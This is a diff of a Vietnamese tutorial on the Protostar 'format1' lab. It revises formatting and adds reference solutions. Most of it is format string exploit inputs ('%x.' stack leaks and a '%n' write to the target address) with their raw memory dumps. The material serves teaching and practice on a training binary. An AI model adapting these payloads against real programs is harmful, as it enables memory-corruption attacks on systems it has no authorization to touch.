@@ -100,9 +100,9 @@ Chúng ta cũng nhận thấy sẽ có 2 byte lẻ do hiệu ứng của padding
 ```bash
 python -c "print 'AAAA' + '%x.' * 200 + 'aa'"
 ```
-```bash
+<pre class="memory">
 AAAA804960c.bffff568.8048469.b7fd8304.b7fd7ff4.bffff568.8048435.bffff730.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5e8.b7eadc76.2.bffff614.bffff620.b7fe1848.bffff5d0.ffffffff.b7ffeff4.804824d.1.bffff5d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5e8.530c9d5c.795e0b4c.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff614.8048450.8048440.b7ff1040.bffff60c.b7fff8f8.2.bffff728.bffff730.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff70b.1f.bfffffe1.f.bffff71b.0.0.0.ab000000.3e356350.d411d673.672da4f7.69e29a20.363836.0.0.6d726f66.317461.<span style="color:aqua">41414141</span>.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
-```
+</pre>
 
 Với formatted string mới này, các byte đã về đúng vị trí.
 Tiếp theo, chúng ta sẽ điều chỉnh số lần đọc từ stack, để đến điều chỉnh `esp` về đúng vị trị trên stack chứa địa chỉ của `target`, cụ thể là về đầu của formatted string.
@@ -118,9 +118,9 @@ Cuối cùng, ta sẽ đổi chuổi thành.
 ```bash
 python -c "print 'AAAA' + '%x.' * 127 + 'a'"
 ```
-```bash
+<pre class="memory">
 AAAA804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.3ba998e9.11fd4ef9.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.4b000000.9c80dc29.b2cb6222.7ef80e2c.696901de.363836.0.6d726f66.317461.41414141.a
-```
+</pre>
 
 Tuy nhiên khi kiểm tra chuỗi mới này, `0x41414141` vẫn xuất hiện.
 Hiện tượng này là do sau khi thay đổi độ dài chuỗi, padding do điều chỉnh `esp` bằng lệnh `esp & 0xfffffff0` đã làm mất đi 8 byte padding.
@@ -130,9 +130,9 @@ Tính lại độ dài chuỗi, ta được tổng là 4 + 3 * 126 + 1 = 383, ch
 ```bash
 python -c "print 'AAAA' + '%x.' * 126"
 ```
-```bash
+<pre class="memory">
 AAAA804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff810.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.663cd21e.4c68040e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff808.bffff810.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.9c000000.395f7251.2db0cce8.81033fbf.69335b0b.363836.0.0.6d726f66.
-```
+</pre>
 
 Chuỗi `0x41414141` đã không xuất hiện. Có vẻ như chúng ta đã chỉnh chính xác vị trí `esp`.
 Để kiểm tra lại đáp án cuối cùng, thay `AAAA` bằng địa chỉ của `target` là `0x08049638` và thêm `%n` vào cuối để bắt đầu quá trình ghi.
@@ -143,9 +143,9 @@ Kết quả ta được.
 ```bash
 python -c "print '\x38\x96\x04\x08' + '%x.' * 126 + '%n' + 'a\n'"
 ```
-```bash
+<pre class="memory">
 8804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.97f7272f.bda3f13f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.a7000000.c336e748.2128340d.193064ab.69d4c2b3.363836.0.6d726f66.317461.aayou have modified the target :)
-```
+</pre>
 
 Mục tiêu đã hoàn thành!
 
@@ -153,6 +153,18 @@ Các bạn có thể tham khảo các đáp án khác trong phần cuối bài. 
 
 ## Ref
 ```bash
-user@protostar:~$ format0 $(python -c "print '%064d\xef\xbe\xad\xde'")
-you have hit the target correctly :)
+user@protostar:~$ format1 $(python -c "print '\x38\x96\x04\x08' + '%x.' * 126 + '%n' + 'aa'")
+8804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.b23ebfe2.986a69f2.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.9a000000.fcbe84e.834ea6e9.a8faeb43.69f834ba.363836.0.6d726f66.317461.aayou have modified the target :)
+```
+```bash
+user@protostar:~$ format1 $(python -c "print '\x38\x96\x04\x08' + '%x' * 126 + '%n'")
+8804960cbffff6c88048469b7fd8304b7fd7ff4bffff6c88048435bffff88cb7ff1040804845bb7fd7ff480484500bffff748b7eadc762bffff774bffff780b7fe1848bffff730ffffffffb7ffeff4804824d1bffff730b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff7482a8caf97d97987000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff77480484508048440b7ff1040bffff76cb7fff8f82bffff884bffff88c0bffff98fbffff99dbffff9a8bffff9c8bffff9dbbffff9e5bffffed5bfffff22bfffff36bfffff45bfffff56bfffff5ebfffff6ebfffff7bbfffffadbfffffc4020b7fe241421b7fe200010f8bfbff61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff86b1fbfffffe1fbffff87b000be0000008779f69b67746ab0a062cb1869ecf50f36383606d726f66317461you have modified the target :)
+```
+```bash
+user@protostar:~$ gdb format1
+(gdb) run $(python -c "print '\x38\x96\x04\x08' + '%x' * 135 + '%naaa'")
+Starting program: /opt/protostar/bin/format1 $(python -c "print '\x38\x96\x04\x08' + '%x' * 135 + '%naaa'")
+8804960cbffff6888048469b7fd8304b7fd7ff4bffff6888048435bffff870b7ff1040804845bb7fd7ff480484500bffff708b7eadc762bffff734bffff740b7fe1848bffff6f0ffffffffb7ffeff4804824d1bffff6f0b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff70896b7a72bbce2f13b000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff73480484508048440b7ff1040bffff72cb7fff8f82bffff855bffff8700bffff988bffff992bffff9b2bffff9c6bffff9cebffff9debffff9f1bffff9febffffa0dbffffa19bffffa24bffffa71bffffa88bffffa99bfffff89bfffff97bfffffa6bfffffd8020b7fe241421b7fe200010f8bfbff61000116438048034420577b7fe30008098048340b3e9c3e9d3e9e3e917119bffff83b1fbfffffe1fbffff84b000008200000043179806a02a34ad8e44c84f6927b2723638360706f2f0072702f74736f746f2f7261742f6e69626d726f66317461aaayou have modified the target :)
+
+Program exited with code 040.
 ```
